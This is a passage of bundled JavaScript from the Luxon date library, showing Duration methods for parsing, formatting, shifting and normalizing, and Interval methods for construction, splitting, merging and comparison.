   * Create a Duration from an ISO 8601 time string.
   * @param {string} text - text to parse
   * @param {Object} opts - options for parsing
   * @param {string} [opts.locale='en-US'] - the locale to use
   * @param {string} opts.numberingSystem - the numbering system to use
   * @param {string} [opts.conversionAccuracy='casual'] - the preset conversion system to use
   * @param {string} [opts.matrix=Object] - the conversion system to use
   * @see https://en.wikipedia.org/wiki/ISO_8601#Times
   * @example Duration.fromISOTime('11:22:33.444').toObject() //=> { hours: 11, minutes: 22, seconds: 33, milliseconds: 444 }
   * @example Duration.fromISOTime('11:00').toObject() //=> { hours: 11, minutes: 0, seconds: 0 }
   * @example Duration.fromISOTime('T11:00').toObject() //=> { hours: 11, minutes: 0, seconds: 0 }
   * @example Duration.fromISOTime('1100').toObject() //=> { hours: 11, minutes: 0, seconds: 0 }
   * @example Duration.fromISOTime('T1100').toObject() //=> { hours: 11, minutes: 0, seconds: 0 }
   * @return {Duration}
   */
  static fromISOTime(text, opts) {
    const [parsed] = parseISOTimeOnly(text);
    if (parsed) {
      return Duration.fromObject(parsed, opts);
    } else {
      return Duration.invalid("unparsable", `the input "${text}" can't be parsed as ISO 8601`);
    }
  }
  /**
   * Create an invalid Duration.
   * @param {string} reason - simple string of why this datetime is invalid. Should not contain parameters or anything else data-dependent
   * @param {string} [explanation=null] - longer explanation, may include parameters and other useful debugging information
   * @return {Duration}
   */
  static invalid(reason, explanation = null) {
    if (!reason) {
      throw new InvalidArgumentError("need to specify a reason the Duration is invalid");
    }
    const invalid = reason instanceof Invalid ? reason : new Invalid(reason, explanation);
    if (Settings.throwOnInvalid) {
      throw new InvalidDurationError(invalid);
    } else {
      return new Duration({ invalid });
    }
  }
  /**
   * @private
   */
  static normalizeUnit(unit) {
    const normalized = {
      year: "years",
      years: "years",
      quarter: "quarters",
      quarters: "quarters",
      month: "months",
      months: "months",
      week: "weeks",
      weeks: "weeks",
      day: "days",
      days: "days",
      hour: "hours",
      hours: "hours",
      minute: "minutes",
      minutes: "minutes",
      second: "seconds",
      seconds: "seconds",
      millisecond: "milliseconds",
      milliseconds: "milliseconds"
    }[unit ? unit.toLowerCase() : unit];
    if (!normalized) throw new InvalidUnitError(unit);
    return normalized;
  }
  /**
   * Check if an object is a Duration. Works across context boundaries
   * @param {object} o
   * @return {boolean}
   */
  static isDuration(o) {
    return o && o.isLuxonDuration || false;
  }
  /**
   * Get  the locale of a Duration, such 'en-GB'
   * @type {string}
   */
  get locale() {
    return this.isValid ? this.loc.locale : null;
  }
  /**
   * Get the numbering system of a Duration, such 'beng'. The numbering system is used when formatting the Duration
   *
   * @type {string}
   */
  get numberingSystem() {
    return this.isValid ? this.loc.numberingSystem : null;
  }
  /**
   * Returns a string representation of this Duration formatted according to the specified format string. You may use these tokens:
   * * `S` for milliseconds
   * * `s` for seconds
   * * `m` for minutes
   * * `h` for hours
   * * `d` for days
   * * `w` for weeks
   * * `M` for months
   * * `y` for years
   * Notes:
   * * Add padding by repeating the token, e.g. "yy" pads the years to two digits, "hhhh" pads the hours out to four digits
   * * Tokens can be escaped by wrapping with single quotes.
   * * The duration will be converted to the set of units in the format string using {@link Duration#shiftTo} and the Durations's conversion accuracy setting.
   * @param {string} fmt - the format string
   * @param {Object} opts - options
   * @param {boolean} [opts.floor=true] - floor numerical values
   * @example Duration.fromObject({ years: 1, days: 6, seconds: 2 }).toFormat("y d s") //=> "1 6 2"
   * @example Duration.fromObject({ years: 1, days: 6, seconds: 2 }).toFormat("yy dd sss") //=> "01 06 002"
   * @example Duration.fromObject({ years: 1, days: 6, seconds: 2 }).toFormat("M S") //=> "12 518402000"
   * @return {string}
   */
  toFormat(fmt, opts = {}) {
    const fmtOpts = {
      ...opts,
      floor: opts.round !== false && opts.floor !== false
    };
    return this.isValid ? Formatter.create(this.loc, fmtOpts).formatDurationFromString(this, fmt) : INVALID$2;
  }
  /**
   * Returns a string representation of a Duration with all units included.
   * To modify its behavior, use `listStyle` and any Intl.NumberFormat option, though `unitDisplay` is especially relevant.
   * @see https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/NumberFormat/NumberFormat#options
   * @param {Object} opts - Formatting options. Accepts the same keys as the options parameter of the native `Intl.NumberFormat` constructor, as well as `listStyle`.
   * @param {string} [opts.listStyle='narrow'] - How to format the merged list. Corresponds to the `style` property of the options parameter of the native `Intl.ListFormat` constructor.
   * @example
   * ```js
   * var dur = Duration.fromObject({ days: 1, hours: 5, minutes: 6 })
   * dur.toHuman() //=> '1 day, 5 hours, 6 minutes'
   * dur.toHuman({ listStyle: "long" }) //=> '1 day, 5 hours, and 6 minutes'
   * dur.toHuman({ unitDisplay: "short" }) //=> '1 day, 5 hr, 6 min'
   * ```
   */
  toHuman(opts = {}) {
    if (!this.isValid) return INVALID$2;
    const l2 = orderedUnits$1.map((unit) => {
      const val = this.values[unit];
      if (isUndefined(val)) {
        return null;
      }
      return this.loc.numberFormatter({ style: "unit", unitDisplay: "long", ...opts, unit: unit.slice(0, -1) }).format(val);
    }).filter((n2) => n2);
    return this.loc.listFormatter({ type: "conjunction", style: opts.listStyle || "narrow", ...opts }).format(l2);
  }
  /**
   * Returns a JavaScript object with this Duration's values.
   * @example Duration.fromObject({ years: 1, days: 6, seconds: 2 }).toObject() //=> { years: 1, days: 6, seconds: 2 }
   * @return {Object}
   */
  toObject() {
    if (!this.isValid) return {};
    return { ...this.values };
  }
  /**
   * Returns an ISO 8601-compliant string representation of this Duration.
   * @see https://en.wikipedia.org/wiki/ISO_8601#Durations
   * @example Duration.fromObject({ years: 3, seconds: 45 }).toISO() //=> 'P3YT45S'
   * @example Duration.fromObject({ months: 4, seconds: 45 }).toISO() //=> 'P4MT45S'
   * @example Duration.fromObject({ months: 5 }).toISO() //=> 'P5M'
   * @example Duration.fromObject({ minutes: 5 }).toISO() //=> 'PT5M'
   * @example Duration.fromObject({ milliseconds: 6 }).toISO() //=> 'PT0.006S'
   * @return {string}
   */
  toISO() {
    if (!this.isValid) return null;
    let s2 = "P";
    if (this.years !== 0) s2 += this.years + "Y";
    if (this.months !== 0 || this.quarters !== 0) s2 += this.months + this.quarters * 3 + "M";
    if (this.weeks !== 0) s2 += this.weeks + "W";
    if (this.days !== 0) s2 += this.days + "D";
    if (this.hours !== 0 || this.minutes !== 0 || this.seconds !== 0 || this.milliseconds !== 0)
      s2 += "T";
    if (this.hours !== 0) s2 += this.hours + "H";
    if (this.minutes !== 0) s2 += this.minutes + "M";
    if (this.seconds !== 0 || this.milliseconds !== 0)
      s2 += roundTo(this.seconds + this.milliseconds / 1e3, 3) + "S";
    if (s2 === "P") s2 += "T0S";
    return s2;
  }
  /**
   * Returns an ISO 8601-compliant string representation of this Duration, formatted as a time of day.
   * Note that this will return null if the duration is invalid, negative, or equal to or greater than 24 hours.
   * @see https://en.wikipedia.org/wiki/ISO_8601#Times
   * @param {Object} opts - options
   * @param {boolean} [opts.suppressMilliseconds=false] - exclude milliseconds from the format if they're 0
   * @param {boolean} [opts.suppressSeconds=false] - exclude seconds from the format if they're 0
   * @param {boolean} [opts.includePrefix=false] - include the `T` prefix
   * @param {string} [opts.format='extended'] - choose between the basic and extended format
   * @example Duration.fromObject({ hours: 11 }).toISOTime() //=> '11:00:00.000'
   * @example Duration.fromObject({ hours: 11 }).toISOTime({ suppressMilliseconds: true }) //=> '11:00:00'
   * @example Duration.fromObject({ hours: 11 }).toISOTime({ suppressSeconds: true }) //=> '11:00'
   * @example Duration.fromObject({ hours: 11 }).toISOTime({ includePrefix: true }) //=> 'T11:00:00.000'
   * @example Duration.fromObject({ hours: 11 }).toISOTime({ format: 'basic' }) //=> '110000.000'
   * @return {string}
   */
  toISOTime(opts = {}) {
    if (!this.isValid) return null;
    const millis = this.toMillis();
    if (millis < 0 || millis >= 864e5) return null;
    opts = {
      suppressMilliseconds: false,
      suppressSeconds: false,
      includePrefix: false,
      format: "extended",
      ...opts,
      includeOffset: false
    };
    const dateTime = DateTime.fromMillis(millis, { zone: "UTC" });
    return dateTime.toISOTime(opts);
  }
  /**
   * Returns an ISO 8601 representation of this Duration appropriate for use in JSON.
   * @return {string}
   */
  toJSON() {
    return this.toISO();
  }
  /**
   * Returns an ISO 8601 representation of this Duration appropriate for use in debugging.
   * @return {string}
   */
  toString() {
    return this.toISO();
  }
  /**
   * Returns a string representation of this Duration appropriate for the REPL.
   * @return {string}
   */
  [Symbol.for("nodejs.util.inspect.custom")]() {
    if (this.isValid) {
      return `Duration { values: ${JSON.stringify(this.values)} }`;
    } else {
      return `Duration { Invalid, reason: ${this.invalidReason} }`;
    }
  }
  /**
   * Returns an milliseconds value of this Duration.
   * @return {number}
   */
  toMillis() {
    if (!this.isValid) return NaN;
    return durationToMillis(this.matrix, this.values);
  }
  /**
   * Returns an milliseconds value of this Duration. Alias of {@link toMillis}
   * @return {number}
   */
  valueOf() {
    return this.toMillis();
  }
  /**
   * Make this Duration longer by the specified amount. Return a newly-constructed Duration.
   * @param {Duration|Object|number} duration - The amount to add. Either a Luxon Duration, a number of milliseconds, the object argument to Duration.fromObject()
   * @return {Duration}
   */
  plus(duration) {
    if (!this.isValid) return this;
    const dur = Duration.fromDurationLike(duration), result = {};
    for (const k of orderedUnits$1) {
      if (hasOwnProperty(dur.values, k) || hasOwnProperty(this.values, k)) {
        result[k] = dur.get(k) + this.get(k);
      }
    }
    return clone$1(this, { values: result }, true);
  }
  /**
   * Make this Duration shorter by the specified amount. Return a newly-constructed Duration.
   * @param {Duration|Object|number} duration - The amount to subtract. Either a Luxon Duration, a number of milliseconds, the object argument to Duration.fromObject()
   * @return {Duration}
   */
  minus(duration) {
    if (!this.isValid) return this;
    const dur = Duration.fromDurationLike(duration);
    return this.plus(dur.negate());
  }
  /**
   * Scale this Duration by the specified amount. Return a newly-constructed Duration.
   * @param {function} fn - The function to apply to each unit. Arity is 1 or 2: the value of the unit and, optionally, the unit name. Must return a number.
   * @example Duration.fromObject({ hours: 1, minutes: 30 }).mapUnits(x => x * 2) //=> { hours: 2, minutes: 60 }
   * @example Duration.fromObject({ hours: 1, minutes: 30 }).mapUnits((x, u) => u === "hours" ? x * 2 : x) //=> { hours: 2, minutes: 30 }
   * @return {Duration}
   */
  mapUnits(fn2) {
    if (!this.isValid) return this;
    const result = {};
    for (const k of Object.keys(this.values)) {
      result[k] = asNumber(fn2(this.values[k], k));
    }
    return clone$1(this, { values: result }, true);
  }
  /**
   * Get the value of unit.
   * @param {string} unit - a unit such as 'minute' or 'day'
   * @example Duration.fromObject({years: 2, days: 3}).get('years') //=> 2
   * @example Duration.fromObject({years: 2, days: 3}).get('months') //=> 0
   * @example Duration.fromObject({years: 2, days: 3}).get('days') //=> 3
   * @return {number}
   */
  get(unit) {
    return this[Duration.normalizeUnit(unit)];
  }
  /**
   * "Set" the values of specified units. Return a newly-constructed Duration.
   * @param {Object} values - a mapping of units to numbers
   * @example dur.set({ years: 2017 })
   * @example dur.set({ hours: 8, minutes: 30 })
   * @return {Duration}
   */
  set(values) {
    if (!this.isValid) return this;
    const mixed = { ...this.values, ...normalizeObject(values, Duration.normalizeUnit) };
    return clone$1(this, { values: mixed });
  }
  /**
   * "Set" the locale and/or numberingSystem.  Returns a newly-constructed Duration.
   * @example dur.reconfigure({ locale: 'en-GB' })
   * @return {Duration}
   */
  reconfigure({ locale, numberingSystem, conversionAccuracy, matrix } = {}) {
    const loc = this.loc.clone({ locale, numberingSystem });
    const opts = { loc, matrix, conversionAccuracy };
    return clone$1(this, opts);
  }
  /**
   * Return the length of the duration in the specified unit.
   * @param {string} unit - a unit such as 'minutes' or 'days'
   * @example Duration.fromObject({years: 1}).as('days') //=> 365
   * @example Duration.fromObject({years: 1}).as('months') //=> 12
   * @example Duration.fromObject({hours: 60}).as('days') //=> 2.5
   * @return {number}
   */
  as(unit) {
    return this.isValid ? this.shiftTo(unit).get(unit) : NaN;
  }
  /**
   * Reduce this Duration to its canonical representation in its current units.
   * Assuming the overall value of the Duration is positive, this means:
   * - excessive values for lower-order units are converted to higher-order units (if possible, see first and second example)
   * - negative lower-order units are converted to higher order units (there must be such a higher order unit, otherwise
   *   the overall value would be negative, see third example)
   * - fractional values for higher-order units are converted to lower-order units (if possible, see fourth example)
   *
   * If the overall value is negative, the result of this method is equivalent to `this.negate().normalize().negate()`.
   * @example Duration.fromObject({ years: 2, days: 5000 }).normalize().toObject() //=> { years: 15, days: 255 }
   * @example Duration.fromObject({ days: 5000 }).normalize().toObject() //=> { days: 5000 }
   * @example Duration.fromObject({ hours: 12, minutes: -45 }).normalize().toObject() //=> { hours: 11, minutes: 15 }
   * @example Duration.fromObject({ years: 2.5, days: 0, hours: 0 }).normalize().toObject() //=> { years: 2, days: 182, hours: 12 }
   * @return {Duration}
   */
  normalize() {
    if (!this.isValid) return this;
    const vals = this.toObject();
    normalizeValues(this.matrix, vals);
    return clone$1(this, { values: vals }, true);
  }
  /**
   * Rescale units to its largest representation
   * @example Duration.fromObject({ milliseconds: 90000 }).rescale().toObject() //=> { minutes: 1, seconds: 30 }
   * @return {Duration}
   */
  rescale() {
    if (!this.isValid) return this;
    const vals = removeZeroes(this.normalize().shiftToAll().toObject());
    return clone$1(this, { values: vals }, true);
  }
  /**
   * Convert this Duration into its representation in a different set of units.
   * @example Duration.fromObject({ hours: 1, seconds: 30 }).shiftTo('minutes', 'milliseconds').toObject() //=> { minutes: 60, milliseconds: 30000 }
   * @return {Duration}
   */
  shiftTo(...units) {
    if (!this.isValid) return this;
    if (units.length === 0) {
      return this;
    }
    units = units.map((u) => Duration.normalizeUnit(u));
    const built = {}, accumulated = {}, vals = this.toObject();
    let lastUnit;
    for (const k of orderedUnits$1) {
      if (units.indexOf(k) >= 0) {
        lastUnit = k;
        let own = 0;
        for (const ak in accumulated) {
          own += this.matrix[ak][k] * accumulated[ak];
          accumulated[ak] = 0;
        }
        if (isNumber(vals[k])) {
          own += vals[k];
        }
        const i2 = Math.trunc(own);
        built[k] = i2;
        accumulated[k] = (own * 1e3 - i2 * 1e3) / 1e3;
      } else if (isNumber(vals[k])) {
        accumulated[k] = vals[k];
      }
    }
    for (const key in accumulated) {
      if (accumulated[key] !== 0) {
        built[lastUnit] += key === lastUnit ? accumulated[key] : accumulated[key] / this.matrix[lastUnit][key];
      }
    }
    normalizeValues(this.matrix, built);
    return clone$1(this, { values: built }, true);
  }
  /**
   * Shift this Duration to all available units.
   * Same as shiftTo("years", "months", "weeks", "days", "hours", "minutes", "seconds", "milliseconds")
   * @return {Duration}
   */
  shiftToAll() {
    if (!this.isValid) return this;
    return this.shiftTo(
      "years",
      "months",
      "weeks",
      "days",
      "hours",
      "minutes",
      "seconds",
      "milliseconds"
    );
  }
  /**
   * Return the negative of this Duration.
   * @example Duration.fromObject({ hours: 1, seconds: 30 }).negate().toObject() //=> { hours: -1, seconds: -30 }
   * @return {Duration}
   */
  negate() {
    if (!this.isValid) return this;
    const negated = {};
    for (const k of Object.keys(this.values)) {
      negated[k] = this.values[k] === 0 ? 0 : -this.values[k];
    }
    return clone$1(this, { values: negated }, true);
  }
  /**
   * Get the years.
   * @type {number}
   */
  get years() {
    return this.isValid ? this.values.years || 0 : NaN;
  }
  /**
   * Get the quarters.
   * @type {number}
   */
  get quarters() {
    return this.isValid ? this.values.quarters || 0 : NaN;
  }
  /**
   * Get the months.
   * @type {number}
   */
  get months() {
    return this.isValid ? this.values.months || 0 : NaN;
  }
  /**
   * Get the weeks
   * @type {number}
   */
  get weeks() {
    return this.isValid ? this.values.weeks || 0 : NaN;
  }
  /**
   * Get the days.
   * @type {number}
   */
  get days() {
    return this.isValid ? this.values.days || 0 : NaN;
  }
  /**
   * Get the hours.
   * @type {number}
   */
  get hours() {
    return this.isValid ? this.values.hours || 0 : NaN;
  }
  /**
   * Get the minutes.
   * @type {number}
   */
  get minutes() {
    return this.isValid ? this.values.minutes || 0 : NaN;
  }
  /**
   * Get the seconds.
   * @return {number}
   */
  get seconds() {
    return this.isValid ? this.values.seconds || 0 : NaN;
  }
  /**
   * Get the milliseconds.
   * @return {number}
   */
  get milliseconds() {
    return this.isValid ? this.values.milliseconds || 0 : NaN;
  }
  /**
   * Returns whether the Duration is invalid. Invalid durations are returned by diff operations
   * on invalid DateTimes or Intervals.
   * @return {boolean}
   */
  get isValid() {
    return this.invalid === null;
  }
  /**
   * Returns an error code if this Duration became invalid, or null if the Duration is valid
   * @return {string}
   */
  get invalidReason() {
    return this.invalid ? this.invalid.reason : null;
  }
  /**
   * Returns an explanation of why this Duration became invalid, or null if the Duration is valid
   * @type {string}
   */
  get invalidExplanation() {
    return this.invalid ? this.invalid.explanation : null;
  }
  /**
   * Equality check
   * Two Durations are equal iff they have the same units and the same values for each unit.
   * @param {Duration} other
   * @return {boolean}
   */
  equals(other) {
    if (!this.isValid || !other.isValid) {
      return false;
    }
    if (!this.loc.equals(other.loc)) {
      return false;
    }
    function eq(v1, v2) {
      if (v1 === void 0 || v1 === 0) return v2 === void 0 || v2 === 0;
      return v1 === v2;
    }
    for (const u of orderedUnits$1) {
      if (!eq(this.values[u], other.values[u])) {
        return false;
      }
    }
    return true;
  }
}
const INVALID$1 = "Invalid Interval";
function validateStartEnd(start2, end2) {
  if (!start2 || !start2.isValid) {
    return Interval.invalid("missing or invalid start");
  } else if (!end2 || !end2.isValid) {
    return Interval.invalid("missing or invalid end");
  } else if (end2 < start2) {
    return Interval.invalid(
      "end before start",
      `The end of an interval must be after its start, but you had start=${start2.toISO()} and end=${end2.toISO()}`
    );
  } else {
    return null;
  }
}
class Interval {
  /**
   * @private
   */
  constructor(config) {
    this.s = config.start;
    this.e = config.end;
    this.invalid = config.invalid || null;
    this.isLuxonInterval = true;
  }
  /**
   * Create an invalid Interval.
   * @param {string} reason - simple string of why this Interval is invalid. Should not contain parameters or anything else data-dependent
   * @param {string} [explanation=null] - longer explanation, may include parameters and other useful debugging information
   * @return {Interval}
   */
  static invalid(reason, explanation = null) {
    if (!reason) {
      throw new InvalidArgumentError("need to specify a reason the Interval is invalid");
    }
    const invalid = reason instanceof Invalid ? reason : new Invalid(reason, explanation);
    if (Settings.throwOnInvalid) {
      throw new InvalidIntervalError(invalid);
    } else {
      return new Interval({ invalid });
    }
  }
  /**
   * Create an Interval from a start DateTime and an end DateTime. Inclusive of the start but not the end.
   * @param {DateTime|Date|Object} start
   * @param {DateTime|Date|Object} end
   * @return {Interval}
   */
  static fromDateTimes(start2, end2) {
    const builtStart = friendlyDateTime(start2), builtEnd = friendlyDateTime(end2);
    const validateError = validateStartEnd(builtStart, builtEnd);
    if (validateError == null) {
      return new Interval({
        start: builtStart,
        end: builtEnd
      });
    } else {
      return validateError;
    }
  }
  /**
   * Create an Interval from a start DateTime and a Duration to extend to.
   * @param {DateTime|Date|Object} start
   * @param {Duration|Object|number} duration - the length of the Interval.
   * @return {Interval}
   */
  static after(start2, duration) {
    const dur = Duration.fromDurationLike(duration), dt = friendlyDateTime(start2);
    return Interval.fromDateTimes(dt, dt.plus(dur));
  }
  /**
   * Create an Interval from an end DateTime and a Duration to extend backwards to.
   * @param {DateTime|Date|Object} end
   * @param {Duration|Object|number} duration - the length of the Interval.
   * @return {Interval}
   */
  static before(end2, duration) {
    const dur = Duration.fromDurationLike(duration), dt = friendlyDateTime(end2);
    return Interval.fromDateTimes(dt.minus(dur), dt);
  }
  /**
   * Create an Interval from an ISO 8601 string.
   * Accepts `<start>/<end>`, `<start>/<duration>`, and `<duration>/<end>` formats.
   * @param {string} text - the ISO string to parse
   * @param {Object} [opts] - options to pass {@link DateTime#fromISO} and optionally {@link Duration#fromISO}
   * @see https://en.wikipedia.org/wiki/ISO_8601#Time_intervals
   * @return {Interval}
   */
  static fromISO(text, opts) {
    const [s2, e2] = (text || "").split("/", 2);
    if (s2 && e2) {
      let start2, startIsValid;
      try {
        start2 = DateTime.fromISO(s2, opts);
        startIsValid = start2.isValid;
      } catch (e3) {
        startIsValid = false;
      }
      let end2, endIsValid;
      try {
        end2 = DateTime.fromISO(e2, opts);
        endIsValid = end2.isValid;
      } catch (e3) {
        endIsValid = false;
      }
      if (startIsValid && endIsValid) {
        return Interval.fromDateTimes(start2, end2);
      }
      if (startIsValid) {
        const dur = Duration.fromISO(e2, opts);
        if (dur.isValid) {
          return Interval.after(start2, dur);
        }
      } else if (endIsValid) {
        const dur = Duration.fromISO(s2, opts);
        if (dur.isValid) {
          return Interval.before(end2, dur);
        }
      }
    }
    return Interval.invalid("unparsable", `the input "${text}" can't be parsed as ISO 8601`);
  }
  /**
   * Check if an object is an Interval. Works across context boundaries
   * @param {object} o
   * @return {boolean}
   */
  static isInterval(o) {
    return o && o.isLuxonInterval || false;
  }
  /**
   * Returns the start of the Interval
   * @type {DateTime}
   */
  get start() {
    return this.isValid ? this.s : null;
  }
  /**
   * Returns the end of the Interval
   * @type {DateTime}
   */
  get end() {
    return this.isValid ? this.e : null;
  }
  /**
   * Returns whether this Interval's end is at least its start, meaning that the Interval isn't 'backwards'.
   * @type {boolean}
   */
  get isValid() {
    return this.invalidReason === null;
  }
  /**
   * Returns an error code if this Interval is invalid, or null if the Interval is valid
   * @type {string}
   */
  get invalidReason() {
    return this.invalid ? this.invalid.reason : null;
  }
  /**
   * Returns an explanation of why this Interval became invalid, or null if the Interval is valid
   * @type {string}
   */
  get invalidExplanation() {
    return this.invalid ? this.invalid.explanation : null;
  }
  /**
   * Returns the length of the Interval in the specified unit.
   * @param {string} unit - the unit (such as 'hours' or 'days') to return the length in.
   * @return {number}
   */
  length(unit = "milliseconds") {
    return this.isValid ? this.toDuration(...[unit]).get(unit) : NaN;
  }
  /**
   * Returns the count of minutes, hours, days, months, or years included in the Interval, even in part.
   * Unlike {@link Interval#length} this counts sections of the calendar, not periods of time, e.g. specifying 'day'
   * asks 'what dates are included in this interval?', not 'how many days long is this interval?'
   * @param {string} [unit='milliseconds'] - the unit of time to count.
   * @param {Object} opts - options
   * @param {boolean} [opts.useLocaleWeeks=false] - If true, use weeks based on the locale, i.e. use the locale-dependent start of the week; this operation will always use the locale of the start DateTime
   * @return {number}
   */
  count(unit = "milliseconds", opts) {
    if (!this.isValid) return NaN;
    const start2 = this.start.startOf(unit, opts);
    let end2;
    if (opts?.useLocaleWeeks) {
      end2 = this.end.reconfigure({ locale: start2.locale });
    } else {
      end2 = this.end;
    }
    end2 = end2.startOf(unit, opts);
    return Math.floor(end2.diff(start2, unit).get(unit)) + (end2.valueOf() !== this.end.valueOf());
  }
  /**
   * Returns whether this Interval's start and end are both in the same unit of time
   * @param {string} unit - the unit of time to check sameness on
   * @return {boolean}
   */
  hasSame(unit) {
    return this.isValid ? this.isEmpty() || this.e.minus(1).hasSame(this.s, unit) : false;
  }
  /**
   * Return whether this Interval has the same start and end DateTimes.
   * @return {boolean}
   */
  isEmpty() {
    return this.s.valueOf() === this.e.valueOf();
  }
  /**
   * Return whether this Interval's start is after the specified DateTime.
   * @param {DateTime} dateTime
   * @return {boolean}
   */
  isAfter(dateTime) {
    if (!this.isValid) return false;
    return this.s > dateTime;
  }
  /**
   * Return whether this Interval's end is before the specified DateTime.
   * @param {DateTime} dateTime
   * @return {boolean}
   */
  isBefore(dateTime) {
    if (!this.isValid) return false;
    return this.e <= dateTime;
  }
  /**
   * Return whether this Interval contains the specified DateTime.
   * @param {DateTime} dateTime
   * @return {boolean}
   */
  contains(dateTime) {
    if (!this.isValid) return false;
    return this.s <= dateTime && this.e > dateTime;
  }
  /**
   * "Sets" the start and/or end dates. Returns a newly-constructed Interval.
   * @param {Object} values - the values to set
   * @param {DateTime} values.start - the starting DateTime
   * @param {DateTime} values.end - the ending DateTime
   * @return {Interval}
   */
  set({ start: start2, end: end2 } = {}) {
    if (!this.isValid) return this;
    return Interval.fromDateTimes(start2 || this.s, end2 || this.e);
  }
  /**
   * Split this Interval at each of the specified DateTimes
   * @param {...DateTime} dateTimes - the unit of time to count.
   * @return {Array}
   */
  splitAt(...dateTimes) {
    if (!this.isValid) return [];
    const sorted = dateTimes.map(friendlyDateTime).filter((d3) => this.contains(d3)).sort((a, b) => a.toMillis() - b.toMillis()), results = [];
    let { s: s2 } = this, i2 = 0;
    while (s2 < this.e) {
      const added = sorted[i2] || this.e, next = +added > +this.e ? this.e : added;
      results.push(Interval.fromDateTimes(s2, next));
      s2 = next;
      i2 += 1;
    }
    return results;
  }
  /**
   * Split this Interval into smaller Intervals, each of the specified length.
   * Left over time is grouped into a smaller interval
   * @param {Duration|Object|number} duration - The length of each resulting interval.
   * @return {Array}
   */
  splitBy(duration) {
    const dur = Duration.fromDurationLike(duration);
    if (!this.isValid || !dur.isValid || dur.as("milliseconds") === 0) {
      return [];
    }
    let { s: s2 } = this, idx = 1, next;
    const results = [];
    while (s2 < this.e) {
      const added = this.start.plus(dur.mapUnits((x) => x * idx));
      next = +added > +this.e ? this.e : added;
      results.push(Interval.fromDateTimes(s2, next));
      s2 = next;
      idx += 1;
    }
    return results;
  }
  /**
   * Split this Interval into the specified number of smaller intervals.
   * @param {number} numberOfParts - The number of Intervals to divide the Interval into.
   * @return {Array}
   */
  divideEqually(numberOfParts) {
    if (!this.isValid) return [];
    return this.splitBy(this.length() / numberOfParts).slice(0, numberOfParts);
  }
  /**
   * Return whether this Interval overlaps with the specified Interval
   * @param {Interval} other
   * @return {boolean}
   */
  overlaps(other) {
    return this.e > other.s && this.s < other.e;
  }
  /**
   * Return whether this Interval's end is adjacent to the specified Interval's start.
   * @param {Interval} other
   * @return {boolean}
   */
  abutsStart(other) {
    if (!this.isValid) return false;
    return +this.e === +other.s;
  }
  /**
   * Return whether this Interval's start is adjacent to the specified Interval's end.
   * @param {Interval} other
   * @return {boolean}
   */
  abutsEnd(other) {
    if (!this.isValid) return false;
    return +other.e === +this.s;
  }
  /**
   * Returns true if this Interval fully contains the specified Interval, specifically if the intersect (of this Interval and the other Interval) is equal to the other Interval; false otherwise.
   * @param {Interval} other
   * @return {boolean}
   */
  engulfs(other) {
    if (!this.isValid) return false;
    return this.s <= other.s && this.e >= other.e;
  }
  /**
   * Return whether this Interval has the same start and end as the specified Interval.
   * @param {Interval} other
   * @return {boolean}
   */
  equals(other) {
    if (!this.isValid || !other.isValid) {
      return false;
    }
    return this.s.equals(other.s) && this.e.equals(other.e);
  }
  /**
   * Return an Interval representing the intersection of this Interval and the specified Interval.
   * Specifically, the resulting Interval has the maximum start time and the minimum end time of the two Intervals.
   * Returns null if the intersection is empty, meaning, the intervals don't intersect.
   * @param {Interval} other
   * @return {Interval}
   */
  intersection(other) {
    if (!this.isValid) return this;
    const s2 = this.s > other.s ? this.s : other.s, e2 = this.e < other.e ? this.e : other.e;
    if (s2 >= e2) {
      return null;
    } else {
      return Interval.fromDateTimes(s2, e2);
    }
  }
  /**
   * Return an Interval representing the union of this Interval and the specified Interval.
   * Specifically, the resulting Interval has the minimum start time and the maximum end time of the two Intervals.
   * @param {Interval} other
   * @return {Interval}
   */
  union(other) {
    if (!this.isValid) return this;
    const s2 = this.s < other.s ? this.s : other.s, e2 = this.e > other.e ? this.e : other.e;
    return Interval.fromDateTimes(s2, e2);
  }
  /**
   * Merge an array of Intervals into a equivalent minimal set of Intervals.
   * Combines overlapping and adjacent Intervals.
   * @param {Array} intervals
   * @return {Array}
   */
  static merge(intervals) {
    const [found, final] = intervals.sort((a, b) => a.s - b.s).reduce(
      ([sofar, current], item) => {
        if (!current) {
          return [sofar, item];
        } else if (current.overlaps(item) || current.abutsStart(item)) {
          return [sofar, current.union(item)];
        } else {
          return [sofar.concat([current]), item];
        }
      },
      [[], null]
    );
    if (final) {
      found.push(final);
    }
    return found;
  }
  /**
   * Return an array of Intervals representing the spans of time that only appear in one of the specified Intervals.
   * @param {Array} intervals
   * @return {Array}
   */
  static xor(intervals) {
    let start2 = null, currentCount = 0;
    const results = [], ends = intervals.map((i2) => [
      { time: i2.s, type: "s" },
      { time: i2.e, type: "e" }
    ]), flattened = Array.prototype.concat(...ends), arr = flattened.sort((a, b) => a.time - b.time);
    for (const i2 of arr) {
      currentCount += i2.type === "s" ? 1 : -1;
      if (currentCount === 1) {
        start2 = i2.time;
      } else {
        if (start2 && +start2 !== +i2.time) {
          results.push(Interval.fromDateTimes(start2, i2.time));
        }
        start2 = null;
      }
    }
    return Interval.merge(results);
  }
  /**
   * Return an Interval representing the span of time in this Interval that doesn't overlap with any of the specified Intervals.
   * @param {...Interval} intervals
   * @return {Array}
   */
  difference(...intervals) {
    return Interval.xor([this].concat(intervals)).map((i2) => this.intersection(i2)).filter((i2) => i2 && !i2.isEmpty());
  }
  /**
   * Returns a string representation of this Interval appropriate for debugging.
   * @return {string}
   */
  toString() {
    if (!this.isValid) return INVALID$1;
    return `[${this.s.toISO()}  ${this.e.toISO()})`;
  }
  /**
   * Returns a string representation of this Interval appropriate for the REPL.
   * @return {string}
   */
  [Symbol.for("nodejs.util.inspect.custom")]() {
    if (this.isValid) {
      return `Interval { start: ${this.s.toISO()}, end: ${this.e.toISO()} }`;
    } else {
      return `Interval { Invalid, reason: ${this.invalidReason} }`;
    }
  }
  /**
   * Returns a localized string representing this Interval. Accepts the same options as the
   * Intl.DateTimeFormat constructor and any presets defined by Luxon, such as
   * {@link DateTime.DATE_FULL} or {@link DateTime.TIME_SIMPLE}. The exact behavior of this method
   * is browser-specific, but in general it will return an appropriate representation of the
   * Interval in the assigned locale. Defaults to the system's locale if no locale has been
   * specified.
   * @see https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DateTimeFormat
   * @param {Object} [formatOpts=DateTime.DATE_SHORT] - Either a DateTime preset or
   * Intl.DateTimeFormat constructor options.
   * @param {Object} opts - Options to override the configuration of the start DateTime.
